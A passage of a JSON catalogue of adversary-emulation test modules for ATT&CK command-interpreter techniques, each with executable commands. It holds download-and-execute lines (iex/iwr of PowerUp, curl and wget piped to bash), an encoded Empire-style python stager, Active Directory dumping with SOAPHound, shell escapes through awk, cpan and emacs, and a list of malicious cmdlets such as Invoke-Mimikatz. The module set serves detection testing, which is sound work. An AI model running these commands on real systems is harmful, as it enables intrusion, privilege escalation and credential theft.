        "command": "$malcmdlets = #{Malicious_cmdlets}\nforeach ($cmdlets in $malcmdlets) {\n    \"function $cmdlets { Write-Host Pretending to invoke $cmdlets }\"}\nforeach ($cmdlets in $malcmdlets) {\n    $cmdlets}\n",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "Malicious_cmdlets",
          "description": "Known Malicious Cmdlets",
          "type": "string",
          "default_value": "\"Add-Persistence\", \"Find-AVSignature\", \"Get-GPPAutologon\", \"Get-GPPPassword\", \"Get-HttpStatus\", \"Get-Keystrokes\", \"Get-SecurityPackages\", \"Get-TimedScreenshot\", \"Get-VaultCredential\", \"Get-VolumeShadowCopy\", \"Install-SSP\", \"Invoke-CredentialInjection\", \"Invoke-DllInjection\", \"Invoke-Mimikatz\", \"Invoke-NinjaCopy\", \"Invoke-Portscan\", \"Invoke-ReflectivePEInjection\", \"Invoke-ReverseDnsLookup\", \"Invoke-Shellcode\", \"Invoke-TokenManipulation\", \"Invoke-WmiCommand\", \"Mount-VolumeShadowCopy\", \"New-ElevatedPersistenceOption\", \"New-UserPersistenceOption\", \"New-VolumeShadowCopy\", \"Out-CompressedDll\", \"Out-EncodedCommand\", \"Out-EncryptedScript\", \"Out-Minidump\", \"PowerUp\", \"PowerView\", \"Remove-Comments\", \"Remove-VolumeShadowCopy\", \"Set-CriticalProcess\", \"Set-MasterBootRecord\"\n"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "49eb9404-5e0f-4031-a179-b40f7be385e3",
      "module_name": "PowerShell Invoke Known Malicious Cmdlets"
    },
    {
      "index": 351,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Check for privilege escalation paths using PowerUp from PowerShellMafia\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1289f78d-22d2-4590-ac76-166737e1811b",
      "module_name": "PowerUp Invoke-AllChecks"
    },
    {
      "index": 352,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Red teamer's avoid IEX and Invoke-WebRequest in your PowerShell commands. Instead, host a text record with a payload to compromise hosts.\n[reference](https://twitter.com/jstrosch/status/1237382986557001729)\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "# creating a custom nslookup function that will indeed call nslookup but forces the result to be \"whoami\"\n# this would not be part of a real attack but helpful for this simulation\nfunction nslookup  { &\"$env:windir\\system32\\nslookup.exe\" @args | Out-Null; @(\"\",\"whoami\")}\npowershell .(nslookup -q=txt example.com 8.8.8.8)[-1]\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "999bff6d-dc15-44c9-9f5c-e1051bfc86e1",
      "module_name": "Abuse Nslookup with DNS Records"
    },
    {
      "index": 353,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Dump BloodHound data using SOAPHound. Upon execution, BloodHound data will be dumped and stored in the specified output directory.\nsrc: https://github.com/FalconForceTeam/SOAPHound\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user",
          "description": "Username for authentication",
          "type": "string",
          "default_value": "$env:USERNAME"
        },
        {
          "name": "password",
          "description": "Password for authentication",
          "type": "string",
          "default_value": "P@ssword1"
        },
        {
          "name": "domain",
          "description": "Domain for authentication",
          "type": "string",
          "default_value": "$env:USERDOMAIN"
        },
        {
          "name": "dc",
          "description": "Domain Controller IP",
          "type": "string",
          "default_value": "10.0.1.14"
        },
        {
          "name": "cachefilename",
          "description": "Cache filename",
          "type": "string",
          "default_value": "c:\\temp\\cache.txt"
        },
        {
          "name": "outputdirectory",
          "description": "Output directory",
          "type": "string",
          "default_value": "c:\\temp\\test2"
        },
        {
          "name": "soaphound_path",
          "description": "Path to SOAPHound binary",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1059.001\\bin\\SOAPHound.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6a5b2a50-d037-4879-bf01-43d4d6cbf73f",
      "module_name": "SOAPHound - Dump BloodHound Data"
    },
    {
      "index": 354,
      "technique_id": "T1059.001",
      "technique_name": "Command and Scripting Interpreter: PowerShell",
      "description": "Build cache using SOAPHound. Upon execution, a cache will be built and stored in the specified cache filename.\nsrc: https://github.com/FalconForceTeam/SOAPHound\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "user",
          "description": "Username for authentication",
          "type": "string",
          "default_value": "$env:USERNAME"
        },
        {
          "name": "password",
          "description": "Password for authentication",
          "type": "string",
          "default_value": "P@ssword1"
        },
        {
          "name": "domain",
          "description": "Domain for authentication",
          "type": "string",
          "default_value": "$env:USERDOMAIN"
        },
        {
          "name": "dc",
          "description": "Domain Controller IP",
          "type": "string",
          "default_value": "10.0.1.14"
        },
        {
          "name": "cachefilename",
          "description": "Cache filename",
          "type": "string",
          "default_value": "c:\\temp\\cache.txt"
        },
        {
          "name": "soaphound_path",
          "description": "Path to SOAPHound binary",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\T1059.001\\bin\\SOAPHound.exe"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "4099086c-1470-4223-8085-8186e1ed5948",
      "module_name": "SOAPHound - Build Cache"
    },
    {
      "index": 355,
      "technique_id": "T1059.002",
      "technique_name": "Command and Scripting Interpreter: AppleScript",
      "description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nReference: https://github.com/EmpireProject/Empire\n",
      "execution": {
        "platforms": [
          "macos"
        ],
        "executor_type": "sh",
        "command": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3600d97d-81b9-4171-ab96-e4386506e2c2",
      "module_name": "AppleScript"
    },
    {
      "index": 356,
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Start-Process \"#{script_path}\"\n",
        "elevation_required": false,
        "cleanup_command": "Remove-Item \"#{script_path}\" -Force -ErrorAction Ignore\n"
      },
      "variables": [
        {
          "name": "command_to_execute",
          "description": "Command to execute within script.",
          "type": "string",
          "default_value": "dir"
        },
        {
          "name": "script_path",
          "description": "Script path.",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1059.003_script.bat"
        }
      ],
      "prerequisites": [
        {
          "description": "Batch file must exist on disk at specified location (#{script_path})\n",
          "check_command": "if (Test-Path \"#{script_path}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item \"#{script_path}\" -Force | Out-Null\nSet-Content -Path \"#{script_path}\" -Value \"#{command_to_execute}\"\n"
        }
      ],
      "rx_module_id": "9e8894c0-50bd-4525-a96c-d4ac78ece388",
      "module_name": "Create and Execute Batch Script"
    },
    {
      "index": 357,
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "description": "Writes text to a file and display the results. This test is intended to emulate the dropping of a malicious file to disk.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "echo \"#{message}\" > \"#{file_contents_path}\" & type \"#{file_contents_path}\"\n",
        "elevation_required": false,
        "cleanup_command": "del \"#{file_contents_path}\" >nul 2>&1\n"
      },
      "variables": [
        {
          "name": "file_contents_path",
          "description": "Path to the file that the command prompt will drop.",
          "type": "path",
          "default_value": "%TEMP%\\test.bin"
        },
        {
          "name": "message",
          "description": "Message that will be written to disk and then displayed.",
          "type": "string",
          "default_value": "Hello from the Windows Command Prompt!"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "127b4afe-2346-4192-815c-69042bec570e",
      "module_name": "Writes text to a file and displays it."
    },
    {
      "index": 358,
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "description": "Command line executed via suspicious invocation. Example is from the 2021 Threat Detection Report by Red Canary.\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "output_file",
          "description": "File to output to",
          "type": "string",
          "default_value": "hello.txt"
        },
        {
          "name": "input_message",
          "description": "Message to write to file",
          "type": "string",
          "default_value": "Hello, from CMD!"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "d0eb3597-a1b3-4d65-b33b-2cda8d397f20",
      "module_name": "Suspicious Execution via Windows Command Shell"
    },
    {
      "index": 359,
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "description": "This test attempts to open a file a specified number of times in Wordpad, then prints the contents. \nIt is designed to mimic BlackByte ransomware's print bombing technique, where tree.dll, which contains the ransom note, is opened in Wordpad 75 times and then printed. \nSee https://redcanary.com/blog/blackbyte-ransomware/. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd /c \"for /l %x in (1,1,#{max_to_print}) do start wordpad.exe /p #{file_to_print}\" | out-null\n",
        "elevation_required": false,
        "cleanup_command": "stop-process -name wordpad -force -erroraction silentlycontinue\n"
      },
      "variables": [
        {
          "name": "file_to_print",
          "description": "File to be opened/printed by Wordpad.",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\T1059_003note.txt"
        },
        {
          "name": "max_to_print",
          "description": "The maximum number of Wordpad windows the test will open/print.",
          "type": "integer",
          "default_value": 75
        }
      ],
      "prerequisites": [
        {
          "description": "File to print must exist on disk at specified location (#{file_to_print})\n",
          "check_command": "if (test-path \"#{file_to_print}\"){exit 0} else {exit 1}\n",
          "install_command": "new-item \"#{file_to_print}\" -value \"This file has been created by T1059.003 Test 4\" -Force | Out-Null\n"
        }
      ],
      "rx_module_id": "6b2903ac-8f36-450d-9ad5-b220e8a2dcb9",
      "module_name": "Simulate BlackByte Ransomware Print Bombing"
    },
    {
      "index": 360,
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "description": "Simulate Raspberry Robin using the \"standard-in\" command prompt feature cmd `/R <` to read and execute a file via cmd.exe\nSee https://redcanary.com/blog/raspberry-robin/. \n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "cmd /r cmd<\"#{input_file}\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "input_file",
          "description": "CMD file that is read by Command Prompt and execute, which launches calc.exe",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder\\T1059.003\\src\\t1059.003_cmd.cmd"
        }
      ],
      "prerequisites": [
        {
          "description": "CMD file must exist on disk at specified location (#{input_file})\n",
          "check_command": "if (Test-Path \"#{input_file}\") {exit 0} else {exit 1}\n",
          "install_command": "New-Item -Type Directory (split-path \"#{input_file}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/raglox-red-team/raw/master/rx_modules/T1059.003/src/t1059.003_cmd.cmd\" -OutFile \"#{input_file}\"\n"
        }
      ],
      "rx_module_id": "df81db1b-066c-4802-9bc8-b6d030c3ba8e",
      "module_name": "Command Prompt read contents from CMD file and execute"
    },
    {
      "index": 361,
      "technique_id": "T1059.003",
      "technique_name": "Command and Scripting Interpreter: Windows Command Shell",
      "description": "    Simulate DarkGate malware's second stage by writing a VBscript to disk directly from the command prompt then executing it.\n    The script will execute 'whoami' then exit.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": " c:\\windows\\system32\\cmd.exe /c cd /d #{script_path} & echo Set objShell = CreateObject(\"WScript.Shell\"):Set objExec = objShell.Exec(\"whoami\"):Set objExec = Nothing:Set objShell = Nothing > #{script_name}.vbs & #{script_name}.vbs",
        "elevation_required": true,
        "cleanup_command": "del \"#{script_name}.vbs\" >nul 2>&1"
      },
      "variables": [
        {
          "name": "script_path",
          "description": "Path in which the script will be written.",
          "type": "path",
          "default_value": "%TEMP%\\"
        },
        {
          "name": "script_name",
          "description": "Script name (without the extension)",
          "type": "string",
          "default_value": "RAGLOXTest"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "00682c9f-7df4-4df8-950b-6dcaaa3ad9af",
      "module_name": "Command prompt writing script to file then executes it"
    },
    {
      "index": 362,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "Creates and executes a simple sh script.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "sh -c \"echo 'echo Hello from the RAGLOX Threat Library' > #{script_path}\"\nsh -c \"echo 'ping -c 4 #{host}' >> #{script_path}\"\nchmod +x #{script_path}\nsh #{script_path}\n",
        "elevation_required": false,
        "cleanup_command": "rm #{script_path}\n"
      },
      "variables": [
        {
          "name": "script_path",
          "description": "Script path",
          "type": "path",
          "default_value": "/tmp/art.sh"
        },
        {
          "name": "host",
          "description": "Host to ping",
          "type": "string",
          "default_value": "8.8.8.8"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7e7ac3ed-f795-4fa5-b711-09d6fbe9b873",
      "module_name": "Create and Execute Bash Shell Script"
    },
    {
      "index": 363,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.\n\nUpon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.\n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "curl -sS https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.004/src/echo-art-fish.sh | bash\nwget --quiet -O - https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.004/src/echo-art-fish.sh | bash\n",
        "elevation_required": false,
        "cleanup_command": "rm /tmp/art-fish.txt\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "d0c88567-803d-4dca-99b4-7ce65e7b257c",
      "module_name": "Command-Line Interface"
    },
    {
      "index": 364,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "chmod +x #{autosuid}\nbash #{autosuid}\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{autosuid}\n"
      },
      "variables": [
        {
          "name": "autosuid",
          "description": "Path to the autosuid shell script",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1059.004/src/AutoSUID.sh"
        },
        {
          "name": "autosuid_url",
          "description": "Path to download autosuid shell script",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh"
        }
      ],
      "prerequisites": [
        {
          "description": "AutoSUID must exist on disk at specified location (#{autosuid})\n",
          "check_command": "if [ -f #{autosuid} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "curl --create-dirs #{autosuid_url} --output #{autosuid}\n"
        }
      ],
      "rx_module_id": "46274fc6-08a7-4956-861b-24cbbaa0503c",
      "module_name": "Harvest SUID executable files"
    },
    {
      "index": 365,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "chmod +x #{linenum}\nbash #{linenum}\n",
        "elevation_required": false,
        "cleanup_command": "rm -rf #{linenum}\n"
      },
      "variables": [
        {
          "name": "linenum",
          "description": "Path to the LinEnum shell script",
          "type": "path",
          "default_value": "PathToRagloxModulesFolder/T1059.004/src/LinEnum.sh"
        },
        {
          "name": "linenum_url",
          "description": "Path to download LinEnum shell script",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/rebootuser/LinEnum/c47f9b226d3ce2848629f25fe142c1b2986bc427/LinEnum.sh"
        }
      ],
      "prerequisites": [
        {
          "description": "LinnEnum must exist on disk at specified location (#{linenum})\n",
          "check_command": "if [ -f #{linenum} ]; then exit 0; else exit 1; fi;\n",
          "install_command": "curl --create-dirs #{linenum_url} --output #{linenum}\n"
        }
      ],
      "rx_module_id": "a2b35a63-9df1-4806-9a4d-5fe0500845f2",
      "module_name": "LinEnum tool execution"
    },
    {
      "index": 366,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "TMPFILE=$(mktemp)\necho \"id\" > $TMPFILE\nbash $TMPFILE\n",
        "elevation_required": false,
        "cleanup_command": "rm $TMPFILE\nunset TMPFILE\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8cd1947b-4a54-41fb-b5ea-07d0ace04f81",
      "module_name": "New script file in the tmp directory"
    },
    {
      "index": 367,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An adversary will want to discover what shell is running so that they can tailor their attacks accordingly. The following commands will discover what shell is running.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "echo $0\nif $(env |grep \"SHELL\" >/dev/null); then env |grep \"SHELL\"; fi\nif $(printenv SHELL >/dev/null); then printenv SHELL; fi\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "7b38e5cc-47be-44f0-a425-390305c76c17",
      "module_name": "What shell is running"
    },
    {
      "index": 368,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An adversary may want to discover which shell's are available so that they might switch to that shell to tailor their attacks to suit that shell. The following commands will discover what shells are available on the host.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cat /etc/shells \n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bf23c7dc-1004-4949-8262-4c1d1ef87702",
      "module_name": "What shells are available"
    },
    {
      "index": 369,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An adversary may type in elaborate multi-line shell commands into a terminal session because they can't or don't wish to create script files on the host. The following command is a simple loop, echoing out RAGLOX Threat Library was here!\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "for i in $(seq 1 5); do echo \"$i, RAGLOX Threat Library was here!\"; sleep 1; done\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b04ed73c-7d43-4dc8-b563-a2fc595cba1a",
      "module_name": "Command line scripts"
    },
    {
      "index": 370,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "[ \"$(uname)\" = 'FreeBSD' ] && encodecmd=\"b64encode -r -\" && decodecmd=\"b64decode -r\" || encodecmd=\"base64 -w 0\" && decodecmd=\"base64 -d\"\nART=$(echo -n \"id\" | $encodecmd)\necho \"\\$ART=$ART\"\necho -n \"$ART\" | $decodecmd |/bin/bash\nunset ART\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "5bec4cc8-f41e-437b-b417-33ff60acf9af",
      "module_name": "Obfuscated command line scripts"
    },
    {
      "index": 371,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. \n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "[ \"$(uname)\" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art\ncat /etc/passwd |grep ^art\nchsh -s /bin/sh art\ncat /etc/passwd |grep ^art\n",
        "elevation_required": true,
        "cleanup_command": "[ \"$(uname)\" = 'FreeBSD' ] && rmuser -y art || userdel art\n"
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "chsh - change login shell, must be installed\n",
          "check_command": "if [ -f /usr/bin/chsh ]; then echo \"exit 0\"; else echo \"exit 1\"; exit 1; fi\n",
          "install_command": "echo \"Automated installer not implemented yet, please install chsh manually\"\n"
        }
      ],
      "rx_module_id": "c7ac59cb-13cc-4622-81dc-6d2fee9bfac7",
      "module_name": "Change login shell"
    },
    {
      "index": 372,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "export ART='echo \"RAGLOX Threat Library was here... T1059.004\"'\necho $ART |/bin/sh\n",
        "elevation_required": false,
        "cleanup_command": "unset ART\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bdaebd56-368b-4970-a523-f905ff4a8a51",
      "module_name": "Environment variable scripts"
    },
    {
      "index": 373,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "cd /tmp\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n",
        "elevation_required": false,
        "cleanup_command": "rm /tmp/art.txt\n"
      },
      "variables": [
        {
          "name": "remote_url",
          "description": "url of remote payload",
          "type": "url",
          "default_value": "https://raw.githubusercontent.com/redcanaryco/raglox-red-team/master/rx_modules/T1059.004/src/pipe-to-shell.sh"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if curl is installed on the machine.\n",
          "check_command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
          "install_command": "which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl\n"
        }
      ],
      "rx_module_id": "fca246a8-a585-4f28-a2df-6495973976a1",
      "module_name": "Detecting pipe-to-shell"
    },
    {
      "index": 374,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "An adversary may want to enumerate the kernel information to tailor their attacks for that particular kernel. The following command will enumerate the kernel information.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "uname -srm\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "3a53734a-9e26-4f4b-ad15-059e767f5f14",
      "module_name": "Current kernel information enumeration"
    },
    {
      "index": 375,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "In awk the begin rule runs the first record without reading or interpreting it. This way a shell can be created and used to break out from restricted environments with the awk command.\nReference - https://gtfobins.github.io/gtfobins/awk/#shell",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "awk 'BEGIN {system(\"/bin/sh &\")}'",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ee72b37d-b8f5-46a5-a9e7-0ff50035ffd5",
      "module_name": "Shell Creation using awk command"
    },
    {
      "index": 376,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "cpan lets you execute perl commands with the ! command. It can be used to break out from restricted environments by spawning an interactive system shell.\nReference - https://gtfobins.github.io/gtfobins/cpan/",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "echo '! exec \"/bin/sh &\"' | PERL_MM_USE_DEFAULT=1  cpan",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "bcd4c2bc-490b-4f91-bd31-3709fe75bbdf",
      "module_name": "Creating shell using cpan command"
    },
    {
      "index": 377,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "BusyBox is a multi-call binary. A multi-call binary is an executable program that performs the same job as more than one utility program. It can be used to break out from restricted environments by spawning an interactive system shell. \nReference - https://gtfobins.github.io/gtfobins/busybox/",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "busybox sh &",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "ab4d04af-68dc-4fee-9c16-6545265b3276",
      "module_name": "Shell Creation using busybox command"
    },
    {
      "index": 378,
      "technique_id": "T1059.004",
      "technique_name": "Command and Scripting Interpreter: Bash",
      "description": "emacs can be used to break out from restricted environments by spawning an interactive system shell. Ref: https://gtfobins.github.io/gtfobins/emacs/  \n",
      "execution": {
        "platforms": [
          "linux",
          "macos"
        ],
        "executor_type": "sh",
        "command": "sudo emacs -Q -nw --eval '(term \"/bin/sh &\")'",
        "elevation_required": true,
        "cleanup_command": null
      },
      "variables": [],
      "prerequisites": [
        {
          "description": "Check if emacs is installed on the machine.\n",
          "check_command": "if [ -x \"$(command -v emacs)\" ]; then echo \"emacs is installed\"; else echo \"emacs is NOT installed\"; exit 1; fi\n",
          "install_command": "which apt && apt update && apt install -y emacs || which pkg && pkg update && pkg install -y emacs || which brew && brew update && brew install --quiet emacs\n"
        }
      ],
      "rx_module_id": "e0742e38-6efe-4dd4-ba5c-2078095b6156",
      "module_name": "emacs spawning an interactive system shell"
    },
    {
      "index": 379,
      "technique_id": "T1059.005",
      "technique_name": "Command and Scripting Interpreter: Visual Basic",
